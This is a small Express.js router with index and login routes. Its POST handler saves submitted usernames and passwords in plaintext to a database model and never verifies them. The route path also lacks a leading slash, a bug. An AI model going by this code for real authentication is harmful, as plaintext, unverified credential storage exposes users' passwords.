var express = require('express')
const logmodel = require('../models/login')

var router = express.Router()

router.get('/', function(req,res,next){
    res.render('index')
})

//routes login
router.get('/login', function(req,res,next){
    res.render('./mylogin/login')
})

//rout login post
router.post('sentMS',function(req,res,nexr){
    let addnew= new logmodel({
        username:req.body.username,
        password:req.body.password
    })
    addnew.save(()=>{
        res.redirect('/')
    })
})

module.exports=router